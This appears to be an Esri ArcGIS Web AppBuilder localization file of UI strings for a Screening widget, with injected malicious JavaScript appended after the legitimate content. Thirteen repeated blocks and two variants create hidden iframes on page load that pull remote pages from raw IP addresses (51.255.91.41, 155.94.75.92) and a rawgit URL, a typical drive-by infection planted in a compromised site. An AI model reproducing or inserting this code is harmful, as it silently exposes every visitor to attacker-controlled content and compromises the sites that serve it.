// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/Screening/setting/nls/strings":{units:{feetUnit:"Feet / Square Feet",milesUnit:"Miles / Acres",metersUnit:"Meters / Square Meters",kilometersUnit:"Kilometers / Square Kilometers",hectaresUnit:"Kilometers / Hectares"},analysisTab:{analysisTabLabel:"Analysis",selectAnalysisLayerLabel:"Select analysis layers",addLayerLabel:"Add Layers",noValidLayersForAnalysis:"No valid layers found in the selected webmap.",noValidFieldsForAnalysis:"No valid fields found in the selected webmap. Please remove the selected layer.",
addLayersHintText:"Hint: Select layers and fields to analyze and display in report",addLayerNameTitle:"Layer Name",addFieldsLabel:"Add Field",addFieldsPopupTitle:"Select Fields",addFieldsNameTitle:"Field Names",aoiToolsLegendLabel:"AOI Tools",aoiToolsDescriptionLabel:"Enable tools to create areas of interest and specify their labels",placenameLabel:"Placename",drawToolsLabel:"Draw Tools",uploadShapeFileLabel:"Upload a Shapefile",coordinatesLabel:"Co-ordinates",coordinatesDrpDwnHintText:"Hint: Select unit to display entered traverses",
coordinatesBearingDrpDwnHintText:"Hint: Select bearing to display entered traverses",allowShapefilesUploadLabel:"Allow uploading shapefiles to analysis",allowShapefilesUploadLabelHintText:"Hint: Display 'Upload shapefile in Analysis' in Report Tab",allowVisibleLayerAnalysisLabel:"Do not analyze or report results for layers that are not visible",allowVisibleLayerAnalysisHintText:"Hint: Layers that have been turned off or are not visible due to scale visibility settings will not be analyzed or included in printed or downloaded results.",
areaUnitsLabel:"Show analysis results in",maxFeatureForAnalysisLabel:"Max features for analysis",maxFeatureForAnalysisHintText:"Hint: Set the maximum number of features for analysis",searchToleranceLabelText:"Search tolerance",searchToleranceHint:"Hint : The search tolerance is only used when analyzing point and line inputs",placenameButtonText:"Placename",drawToolsButtonText:"Draw",shapefileButtonText:"Shapefile",coordinatesButtonText:"Coordinates",invalidLayerErrorMsg:"Please configure the fields for"},
downloadTab:{downloadLegend:"Download Settings",reportLegend:"Report Settings",downloadTabLabel:"Download",syncEnableOptionLabel:"Feature Layers",syncEnableOptionHint:"Hint: Used to download feature information for features intersecting the area of interest in the indicated formats.",syncEnableOptionNote:"Note: Sync enabled feature services are required for the File Geodatabase option.",extractDataTaskOptionLabel:"Extract Data Task geoprocessing service",extractDataTaskOptionHint:"Hint: Use a published Extract Data Task geoprocessing service to download features that intersect the area of interest in File Geodatabase or Shapefile formats.",
cannotDownloadOptionLabel:"Disable download",syncEnableTableHeaderTitle:{layerNameLabel:"Layer name",csvFileFormatLabel:"CSV",fileGDBFormatLabel:"File Geodatabase",allowDownloadLabel:"Allow Download"},setButtonLabel:"Set",GPTaskLabel:"Specify url to geoprocessing service",printGPServiceLabel:"Print Service URL",setGPTaskTitle:"Specify required Geoprocessing Service URL",logoLabel:"Logo",logoChooserHint:"Hint: Click on image icon to change the image",footnoteLabel:"Footnote",columnTitleColorPickerLabel:"Color for column titles",
reportTitleLabel:"Report Title",errorMessages:{invalidGPTaskURL:"Invalid geoprocessing service. Please select geoprocessing service containing Extract Data Task.",noExtractDataTaskURL:"Please select any geoprocessing service containing Extract Data Task."}},generalTab:{generalTabLabel:"General",tabLabelsLegend:"Panel Labels",tabLabelsHint:"Hint: Specify Labels",AOITabLabel:"Area of Interest Panel",ReportTabLabel:"Report Panel",bufferSettingsLegend:"Buffer Settings",defaultBufferDistanceLabel:"Default Buffer Distance",
defaultBufferUnitsLabel:"Buffer Units",generalBufferSymbologyHint:"Hint: Set symbology to be used for displaying buffers around defined areas of interest",aoiGraphicsSymbologyLegend:"AOI Graphics Symbology",aoiGraphicsSymbologyHint:"Hint: Set symbology to be used while defining point, line and polygon areas of interest",pointSymbologyLabel:"Point",previewLabel:"Preview",lineSymbologyLabel:"Line",polygonSymbologyLabel:"Polygon",aoiBufferSymbologyLabel:"Buffer Symbology",pointSymbolChooserPopupTitle:"Address or location symbol",
polygonSymbolChooserPopupTitle:"Select symbol to highlight polygon",lineSymbolChooserPopupTitle:"Select symbol to highlight line",aoiSymbolChooserPopupTitle:"Set buffer symbol",aoiTabText:"AOI",reportTabText:"Report",invalidSymbolValue:"Invalid symbol value."},searchSourceSetting:{searchSourceSettingTabTitle:"Search Source Settings",searchSourceSettingTitle:"Search Source Settings",searchSourceSettingTitleHintText:"Add and configure geocode services or feature layers as search sources. These specified sources determine what is searchable within the search box",
addSearchSourceLabel:"Add Search Source",featureLayerLabel:"Feature Layer",geocoderLabel:"Geocoder",generalSettingLabel:"General Setting",allPlaceholderLabel:"Placeholder text for searching all:",allPlaceholderHintText:"Hint: Enter text to be shown as placeholder while searching all layers and geocoder",generalSettingCheckboxLabel:"Show pop-up for the found feature or location",countryCode:"Country or Region Code(s)",countryCodeEg:"e.g. ",countryCodeHint:"Leaving this value blank will search all countries and regions",
questionMark:"?",searchInCurrentMapExtent:"Only search in current map extent",zoomScale:"Zoom Scale",locatorUrl:"Geocoder URL",locatorName:"Geocoder Name",locatorExample:"Example",locatorWarning:"This version of geocoding service is not supported. The widget supports geocoding service 10.0 and above.",locatorTips:"Suggestions are not available because the geocoding service doesn't support suggest capability.",layerSource:"Layer Source",setLayerSource:"Set Layer Source",setGeocoderURL:"Set Geocoder URL",
searchLayerTips:"Suggestions are not available because the feature service doesn't support pagination capability.",placeholder:"Placeholder Text",searchFields:"Search Fields",displayField:"Display Field",exactMatch:"Exact Match",maxSuggestions:"Maximum Suggestions",maxResults:"Maximum Results",enableLocalSearch:"Enable local search",minScale:"Min Scale",minScaleHint:"When the map scale is larger than this scale, local search will be applied",radius:"Radius",radiusHint:"Specifies the radius of an area around current map center that is used to boost the rank of geocoding candidates so that candidates closest to the location are returned first",
setSearchFields:"Set Search Fields",set:"Set",invalidUrlTip:"The URL ${URL} is invalid or inaccessible.",invalidSearchSources:"Invalid search source settings"},errorMsg:{textboxFieldsEmptyErrorMsg:"Please fill the required fields",bufferDistanceFieldsErrorMsg:"Please enter valid values",invalidSearchToleranceErrorMsg:"Please enter a valid value for search tolerance",atLeastOneCheckboxCheckedErrorMsg:"Invalid configuration: At least one AOI Tool is required.",noLayerAvailableErrorMsg:"No layers available",
layerNotSupportedErrorMsg:"Not Supported ",noFieldSelected:"Please use the edit action to select fields for analysis.",duplicateFieldsLabels:'Duplicate label "${labelText}" added for : "${itemNames}"',noLayerSelected:"Please select at least one layer for analysis",errorInSelectingLayer:"Unable to complete the operation of selecting layer. Please try again.",errorInMaxFeatureCount:"Please enter valid max features count for analysis."},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});